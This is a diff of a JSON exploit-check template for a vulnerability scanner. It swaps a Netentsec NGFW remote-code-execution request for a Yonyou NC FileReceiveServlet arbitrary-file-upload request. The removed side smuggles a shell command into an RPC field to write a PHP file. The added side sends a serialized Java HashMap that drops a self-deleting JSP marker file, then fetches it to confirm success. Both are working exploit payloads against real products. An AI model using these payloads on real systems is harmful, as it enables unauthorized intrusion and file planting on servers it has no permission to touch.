@@ -1,15 +1,15 @@
 {
-    "Name": "netentsec-ngfw-rce",
-    "Description": "netentsec-ngfw-rce",
-    "Product": "Netentsec",
+    "Name": "Yonyou NC Arbitrary File Upload",
+    "Description": "Yonyou NC Arbitrary File Upload",
+    "Product": "Yonyou",
     "author": "chumeng",
     "Request":[
         {
         "Method": "POST",
-        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
-        "Uri":"/directdata/direct/router",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36","Content-Type":"multipart/form-data;"},
+        "Uri":"/servlet/FileReceiveServlet",
         "Port":"",
-        "Data":"{\"action\":\"SSLVPN_Resource\",\"method\":\"deleteImage\",\"data\":[{\"data\":[\"/var/www/html/d.txt;echo '<?php echo md5(123);unlink(__FILE__);?>' >/var/www/html/chumeng.php\"]}],\"type\":\"rpc\",\"tid\":17}",
+        "Data":"\\xac\\xed\\x00\\x05sr\\x00\\x11java.util.HashMap\\x05\\a\\xda\\xc1\\xc3\\x16`\\xd1\\x03\\x00\\x02F\\x00\nloadFactorI\\x00\tthresholdxp?@\\x00\\x00\\x00\\x00\\x00\fw\b\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x02t\\x00\tFILE_NAMEt\\x00\tchumengchumeng.jspt\\x00\\x10TARGET_FILE_PATHt\\x00\\x10./webapps/nc_webx<%out.print(\"chumeng12123\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>",
         "Follow_redirects":"false",
         "Upload":{"Name": "","fileName": "","filePath": "" },
         "Response":{
@@ -18,13 +18,8 @@
                 {
                 "Operation": "contains", 
                 "Key":"",
-                "Value": "SSLVPN_Resource"
+                "Value": "renyizifumofamen"
                 },
-                {
-                 "Operation": "contains", 
-                 "Key":"",
-                 "Value": "\"result\":{\"success\":true}"
-                 },
                  {
                 "Operation": "code", 
                 "Key":"",
@@ -33,10 +28,10 @@
         ]
         },
         "Next_decide":"AND"
-                }, {
+                },{
                     "Method": "GET",
                     "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
-                    "Uri":"/chumeng.php",
+                    "Uri":"/chumengchumeng.jsp",
                     "Port":"",
                     "Data":"",
                     "Follow_redirects":"false",
@@ -47,7 +42,7 @@
                             {
                             "Operation": "contains", 
                             "Key":"",
-                            "Value": "202cb962ac59075b964b07152d234b70"
+                            "Value": "chumeng12123"
                             },
                              {
                             "Operation": "code", 
